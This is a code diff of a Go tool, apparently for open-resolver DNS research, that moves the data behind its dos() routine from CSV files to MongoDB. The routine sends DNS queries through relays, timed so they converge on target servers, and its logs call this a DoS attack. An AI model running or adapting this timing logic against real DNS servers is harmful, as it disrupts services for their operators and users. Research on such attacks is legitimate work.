@@ -1,16 +1,21 @@
 package main
 
 import (
+	"context"
 	"encoding/base64"
 	"encoding/csv"
 	"encoding/json"
 	"fmt"
 	"github.com/jedisct1/dlog"
 	"github.com/miekg/dns"
+	"go.mongodb.org/mongo-driver/bson"
+	"go.mongodb.org/mongo-driver/mongo"
+	"go.mongodb.org/mongo-driver/mongo/options"
 	"log"
 	"math/rand"
 	"net"
 	"os"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
@@ -258,60 +263,89 @@ func (app *App) randomQueryTest(num int, qtype uint16) {
 }
 
 func (app *App) dos(qtype uint16, multiLevel bool) {
-	// load prepared list
-	fout, err := os.OpenFile("send_result.csv", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+	ctx := context.Background()
+	// creat mongodb client
+	client, err := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
 	if err != nil {
-		log.Fatal("Unable to read input file ", err)
+		dlog.Errorf("Unable to connect to mongodb: %v", err)
+		return
 	}
-	fout.WriteString("server,relay,sendTime,realSendTime,sendTimeDiff,arrivalTime,realArrivalTime,realRtt,rtt,variation\n")
+	// find latest probe
+	collection := client.Database("odns").Collection("prepare")
+	cursor, err := collection.Find(ctx, nil, options.Find().SetSort(bson.D{{"probe_id", -1}}))
+	if err != nil {
+		dlog.Errorf("Unable to find latest probe: %v", err)
+		return
+	}
+	var latestProbe bson.M
+	if cursor.Next(ctx) {
+		err := cursor.Decode(&latestProbe)
+		if err != nil {
+			return
+		}
+	}
+	if latestProbe == nil {
+		dlog.Errorf("Unable to find latest probe")
+		return
+	}
+	// find all with latest probe_id
+	cursor, err = collection.Find(ctx, bson.M{"probe_id": latestProbe["probe_id"]})
+	if err != nil {
+		dlog.Errorf("Unable to find latest probe: %v", err)
+		return
+	}
+	var prepareList []bson.M
+	if err = cursor.All(ctx, &prepareList); err != nil {
+		dlog.Errorf("Unable to find latest probe: %v", err)
+		return
+	}
 
-	path, _ := os.Getwd()
-	fmt.Println("Prepared list: " + path) // for example /home/user
+	// sort prepareList by send_time asc, using library
+	sort.Slice(prepareList, func(i, j int) bool {
+		return prepareList[i]["send_time"].(int64) < prepareList[j]["send_time"].(int64)
+	})
 
-	records := readCsvFile("./prepared_list.csv")[1:]
-	fmt.Println("Prepared list length: ", len(records))
+	// Connect to send_result collection
+	collectionResult := client.Database("odns").Collection("send_result")
+
+	fmt.Println("Prepared list length: ", len(prepareList))
 
 	// start dos
 	var totalCount atomic.Uint64
 	var successCount atomic.Uint64
 	// get the minimum sendTime
 	minSendTime := int64(0)
-	for _, record := range records {
-		sendTime, _ := strconv.ParseInt(record[2], 10, 64)
+	for _, record := range prepareList {
+		sendTime := record["send_time"].(int64)
 		if minSendTime == 0 || sendTime < minSendTime {
 			minSendTime = sendTime
 		}
 	}
 	// adjust sendTime and arrivalTime
 	offset := NowUnixMillion() - minSendTime + 1000
-	for _, record := range records {
-		sendTime, _ := strconv.ParseInt(record[2], 10, 64)
-		arrivalTime, _ := strconv.ParseInt(record[3], 10, 64)
+	for _, record := range prepareList {
+		sendTime := record["send_time"].(int64)
+		arrivalTime := record["arrival_time"].(int64)
 
 		// 1000ms delay before first send
-		sendTime = sendTime + offset
-		arrivalTime = arrivalTime + offset
-
-		record[2] = strconv.FormatInt(sendTime, 10)
-		record[3] = strconv.FormatInt(arrivalTime, 10)
+		record["send_time"] = sendTime + offset
+		record["arrival_time"] = arrivalTime + offset
 	}
 
-	lock := sync.Mutex{}
 	wg := sync.WaitGroup{}
-	wg.Add(len(records))
-	for i, record := range records {
-		recordCopy := make([]string, len(record))
-		copy(recordCopy, record)
+	wg.Add(len(prepareList))
+	for i, record := range prepareList {
+		recordCopy := record
 
-		go func(record []string, index int) {
+		go func(record bson.M, index int) {
 			defer wg.Done()
 
-			server := record[0]
-			relay := record[1]
-			sendTime, _ := strconv.ParseInt(record[2], 10, 64)
-			arrivalTime, _ := strconv.ParseInt(record[3], 10, 64)
-			rtt, _ := strconv.ParseFloat(record[4], 64)
-			variation, _ := strconv.ParseFloat(record[5], 64)
+			server := record["server"].(string)
+			relay := record["relay"].(string)
+			sendTime := record["send_time"].(int64)
+			arrivalTime := record["arrival_time"].(int64)
+			rtt := record["rtt"].(int64)
+			variation := record["variation"].(int64)
 
 			// make a query for {server}-{relay}-{#randomStr}-{index}.test.xxt.asia
 			q := app.buildQuery(server, relay, qtype, multiLevel)
@@ -329,11 +363,8 @@ func (app *App) dos(qtype uint16, multiLevel bool) {
 			// Increase totalCount
 			totalCount.Add(1)
 
-			if err != nil {
-				dlog.Warn(err)
-				return
-			} else if len(resp.Answer) == 0 {
-				dlog.Warn("resp.Answer is empty")
+			if err != nil || len(resp.Answer) == 0 {
+				dlog.Warnf("Response is empty: %s,%s, err: %v, resp: %v, realRtt: %dms", server, relay, err, resp, realRtt)
 				return
 			}
 
@@ -351,22 +382,32 @@ func (app *App) dos(qtype uint16, multiLevel bool) {
 				realArrivalTime = txtJson.RecvTime
 			}
 
-			// write send result to file
-			lock.Lock()
-			fout.WriteString(fmt.Sprintf("%s,%s,%d,%d,%d,%d,%d,%d,%.2f,%.2f\n",
-				server, relay, sendTime, realSendTime, sendTimeDiff, arrivalTime, realArrivalTime, realRtt, rtt, variation))
-			//log.Println("Current progress: ", totalCount, "/", len(records))
-			lock.Unlock()
+			// write send result to remote mongodb
+			_, err = collectionResult.InsertOne(ctx, bson.M{
+				"server":          server,
+				"relay":           relay,
+				"sendTime":        sendTime,
+				"realSendTime":    realSendTime,
+				"sendTimeDiff":    sendTimeDiff,
+				"arrivalTime":     arrivalTime,
+				"realArrivalTime": realArrivalTime,
+				"realRtt":         realRtt,
+				"rtt":             rtt,
+				"variation":       variation,
+				"probe_id":        latestProbe["probe_id"],
+			})
+			if err != nil {
+				dlog.Errorf("Unable to write send result to mongodb: %v", err)
+				return
+			}
 
 			successCount.Add(1)
-			//fmt.Println(server, relay, realRtt, resp.Answer)
 		}(recordCopy, i)
 	}
 	wg.Wait()
-	log.Printf("DOS finised with %d/%d success: %d success rate: %.2f", totalCount.Load(), len(records),
+	log.Printf("DOS finised with %d/%d success: %d success rate: %.2f", totalCount.Load(), len(prepareList),
 		successCount.Load(), float64(successCount.Load())/float64(totalCount.Load()))
 	log.Printf("Params: qtype: %s, multiLevel: %v", dns.TypeToString[qtype], multiLevel)
-	fout.Close()
 }
 
 func (app *App) dosPending(qtype uint16, multiLevel bool) {
@@ -397,7 +438,7 @@ func (app *App) dosPending(qtype uint16, multiLevel bool) {
 				return
 			}
 
-			log.Println("Current progress: ", delay, "ms, realRtt: ", realRtt, "ms")
+			log.Println("Current progress: ", delay, "ms, realRtt: ", realRtt-int64(delay), "ms")
 		}()
 	}
 	log.Println("DOS pending attack finised")
